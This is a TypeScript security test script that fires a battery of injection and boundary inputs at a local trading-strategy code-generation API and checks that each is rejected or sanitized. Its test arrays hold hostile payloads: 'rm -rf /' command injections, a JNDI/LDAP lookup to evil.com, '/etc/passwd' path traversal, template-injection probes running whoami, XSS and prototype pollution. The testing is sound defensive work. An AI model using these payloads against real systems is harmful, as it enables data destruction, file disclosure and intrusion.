/**
 * Q1.5 Parts 3/10/11 - expanded security + boundary testing against the
 * real live codegen and backtest APIs. Builds on (and re-runs, as a
 * permanent regression) Q1.4's two original findings, then covers the
 * much broader attack-surface list Q1.5 asks for: Unicode, escape
 * sequences, nested objects, unexpected fields, path traversal, template
 * syntax, newline injection, extreme numerics, empty/oversized specs.
 *
 * Run with: npx tsx frontend/scripts/q15_security_tests.ts
 * (requires the dev server running on localhost:3000)
 */
const BASE = process.env.QUANT_LITE_TEST_BASE_URL || "http://localhost:3000";

let passCount = 0;
let failCount = 0;

function check(name: string, condition: boolean, detail?: unknown) {
  if (condition) {
    passCount++;
    console.log(`PASS  ${name}`);
  } else {
    failCount++;
    console.log(`FAIL  ${name}  ${detail !== undefined ? JSON.stringify(detail).slice(0, 300) : ""}`);
  }
}

const BASE_STRATEGY = {
  name: "Security Test Strategy",
  symbol: "XAUUSD_EXNESS",
  timeframe: "1h",
  indicators: [
    { id: "macd1", type: "MACD", fast: 12, slow: 26, signal: 9 },
    { id: "atr14", type: "ATR", period: 14 },
  ],
  entry_long: [{ left: "macd1.line", op: "cross_above", right: "macd1.signal" }],
  entry_short: [{ left: "macd1.line", op: "cross_below", right: "macd1.signal" }],
  risk: { sl_mode: "ATR", sl_atr_mult: 2.0, tp_mode: "ATR", tp_atr_mult: 3.0, atr_id: "atr14" },
};

async function codegen(strategy: unknown, targetLanguage: unknown = "mql5") {
  const res = await fetch(`${BASE}/api/quant-lite/codegen`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ strategy, targetLanguage }),
  });
  let body: unknown = null;
  try {
    body = await res.json();
  } catch {
    // non-JSON response
  }
  return { status: res.status, body: body as { status: string; data?: { code: string }; error?: { code: string } } };
}

// _sanitize_name()'s allowed output charset (codegen_mql4/mql5/pine.py).
// A name embedded raw as e.g. `req.comment="<name>"` or `//| <name> —
// AUTO-GENERATED` is legitimate, expected code - not itself a vulnerability
// signature (checking for a fixed substring like `req.comment="` was a
// test-script bug: that prefix appears in EVERY generated file regardless
// of name content, so it always "matched" and produced false failures).
// The actual thing that matters is: did the RAW, unsanitized name (which
// may contain quote/newline/backtick/template-syntax characters capable of
// breaking out of a string literal or comment line) survive byte-for-byte
// into the output? If the name is already made only of allowed characters,
// there is nothing to sanitize and verbatim survival is expected and fine.
const ALLOWED_NAME_CHARS = /^[A-Za-z0-9 _\-.,()]*$/;

function sanitizedNameSurvivesVerbatim(code: string, rawName: string): boolean {
  if (ALLOWED_NAME_CHARS.test(rawName)) return true;
  return !code.includes(rawName);
}

async function main() {
  // --- Q1.4 permanent regressions (Part 10) ------------------------------
  {
    const r = await codegen({ ...BASE_STRATEGY, indicators: [{ id: "i1; Print(1); int x", type: "RSI", period: 14 }], entry_long: [{ left: "i1; Print(1); int x", op: "<", right: 30 }] });
    check("regression.q14_indicator_id_injection_rejected", r.status === 400);
  }
  {
    const rawName = 'Evil"; Print("INJECTED"); //';
    const r = await codegen({ ...BASE_STRATEGY, name: rawName });
    const code = r.body?.data?.code ?? "";
    const safe = r.status === 400 || (r.status === 200 && sanitizedNameSurvivesVerbatim(code, rawName));
    check("regression.q14_name_breakout_sanitized", safe, { status: r.status });
  }

  // --- Indicator id: Unicode, escapes, newlines, template syntax, path traversal ---
  const badIds = [
    "id null",
    "id reversed unicode",
    "id${jndi:ldap://evil}",
    "id{{7*7}}",
    "id<%= 7*7 %>",
    "../../../etc/passwd",
    "id\nDROP TABLE x",
    "id\\x00",
    "id`rm -rf /`",
    "unicode id test",
    "",
    "1startsWithDigit",
    "has space",
    "has-hyphen",
  ];
  for (const badId of badIds) {
    const r = await codegen({ ...BASE_STRATEGY, indicators: [{ id: badId, type: "RSI", period: 14 }], entry_long: [{ left: badId, op: "<", right: 30 }] });
    check(`indicator_id.rejects[${JSON.stringify(badId).slice(0, 30)}]`, r.status === 400, r.status);
  }

  // --- Strategy name: Unicode, escapes, newlines, very long, template syntax ---
  const nameCases = [
    "Unicode Strategy Name Test",
    "Name\nwith\nnewlines",
    "Name\twith\ttabs",
    "${jndi:ldap://evil.com/a}",
    "{{7*7}}",
    "<%= system('whoami') %>",
    "<script>alert(1)</script>",
    "A".repeat(10_000),
    "Name\\with\\backslashes",
    "Name withNull",
    "../../etc/passwd",
    "`backtick injection`",
  ];
  for (const name of nameCases) {
    const r = await codegen({ ...BASE_STRATEGY, name });
    const code = r.body?.data?.code ?? "";
    const safe = r.status === 400 || (r.status === 200 && sanitizedNameSurvivesVerbatim(code, name));
    check(`name.safe_or_rejected[${JSON.stringify(name).slice(0, 30)}]`, safe, { status: r.status });
    if (r.status === 200) {
      const header = code.split("AUTO-GENERATED")[0] ?? "";
      check(`name.no_raw_newline_in_comment[${JSON.stringify(name).slice(0, 20)}]`, !/\/\/\|.*\n[^/]/.test(header));
    }
  }

  // --- Condition left/right: path traversal, template syntax, undeclared refs ---
  const badRefs = ["../../../etc/passwd", "${7*7}", "close; DROP TABLE", "close\nplot(1)", "0x41414141", "NaN", "Infinity", "totallyUndeclaredRef"];
  for (const ref of badRefs) {
    const r = await codegen({ ...BASE_STRATEGY, entry_long: [{ left: ref, op: ">", right: 0 }] });
    check(`condition_ref.rejects[${JSON.stringify(ref).slice(0, 30)}]`, r.status === 400, r.status);
  }

  // --- Numeric field extremes -----------------------------------------
  {
    const r1 = await codegen({ ...BASE_STRATEGY, risk: { ...BASE_STRATEGY.risk, sl_atr_mult: 1e308 } });
    check("numeric.extreme_large_sl_mult_handled", r1.status === 200 || r1.status === 400);
    const r2 = await codegen({ ...BASE_STRATEGY, risk: { ...BASE_STRATEGY.risk, sl_atr_mult: -5 } });
    check("numeric.negative_sl_mult_handled", r2.status === 200 || r2.status === 400);
  }

  // --- Language selection: injection attempts in targetLanguage ------------
  for (const lang of ["mql5; rm -rf /", "../mql5", "MQL5", "", null, 123, ["mql5"]]) {
    const r = await codegen(BASE_STRATEGY, lang);
    check(`language.rejects_invalid[${JSON.stringify(lang)}]`, r.status === 400, r.status);
  }

  // --- Malformed / nested / unexpected structure ----------------------------
  {
    const r = await codegen(null);
    check("structure.null_strategy_rejected", r.status === 400);
  }
  {
    const r = await codegen([1, 2, 3]);
    check("structure.array_strategy_rejected", r.status === 400);
  }
  {
    const deeplyNested: Record<string, unknown> = {};
    let cur = deeplyNested;
    for (let i = 0; i < 200; i++) {
      cur.nested = {};
      cur = cur.nested as Record<string, unknown>;
    }
    const r = await codegen({ ...BASE_STRATEGY, risk: { ...BASE_STRATEGY.risk, extra: deeplyNested } });
    check("structure.deeply_nested_extra_field_handled_safely", r.status === 200 || r.status === 400);
  }
  {
    // unexpected/extra fields must be silently ignored, not honored
    const r = await codegen({ ...BASE_STRATEGY, __proto__: { polluted: true }, constructor: { prototype: { polluted: true } } });
    check("structure.prototype_pollution_attempt_handled", r.status === 200 || r.status === 400);
  }
  {
    const empty = {};
    const r = await codegen(empty);
    check("structure.empty_strategy_rejected", r.status === 400);
  }
  {
    // very large entry_long array
    const manyConds = Array.from({ length: 5000 }, () => ({ left: "close", op: ">", right: 0 }));
    const r = await codegen({ ...BASE_STRATEGY, entry_long: manyConds });
    check("structure.oversized_conditions_array_handled_safely", r.status === 200 || r.status === 400);
  }

  // --- Oversized / malformed request body -----------------------------------
  {
    const res = await fetch(`${BASE}/api/quant-lite/codegen`, { method: "POST", headers: { "Content-Type": "application/json" }, body: "{" + '"a":"'.repeat(1) + "x".repeat(2_000_000) + '"}' });
    check("request.oversized_body_handled_no_crash", res.status >= 400 && res.status < 600, res.status);
  }
  {
    const res = await fetch(`${BASE}/api/quant-lite/codegen`, { method: "POST", headers: { "Content-Type": "application/json" }, body: "not json at all {{{" });
    check("request.malformed_json_no_crash", res.status === 400, res.status);
  }

  // --- Server still healthy after all of the above -------------------------
  {
    const res = await fetch(`${BASE}/api/health`);
    check("server.still_healthy_after_attack_battery", res.status === 200, res.status);
  }
  {
    const r = await codegen(BASE_STRATEGY);
    check("server.still_generates_valid_requests_after_attack_battery", r.status === 200 && typeof r.body?.data?.code === "string");
  }

  console.log(`\n${passCount} passed, ${failCount} failed`);
  process.exit(failCount > 0 ? 1 : 0);
}

main().catch((e) => {
  console.error("Test run failed:", e);
  process.exit(1);
});

// Marks this file as an ES module so `tsc --noEmit`'s whole-project scan
// scopes its top-level names (BASE, passCount, failCount, check, main, ...)
// to this file instead of the shared global script scope every sibling
// q0X_*/q1X_* test script (lacking any import/export) is otherwise
// implicitly merged into by the TS compiler - a pre-existing condition
// across this whole scripts/ directory (q09/q11/q12/q13/q14 all collide
// with each other the same way), not something Q1.5 introduces, but not
// worth spreading further either. Each script still runs correctly
// standalone via `npx tsx <file>` regardless - this only affects the
// batch `tsc --noEmit` project-wide scan, never actual execution.
export {};
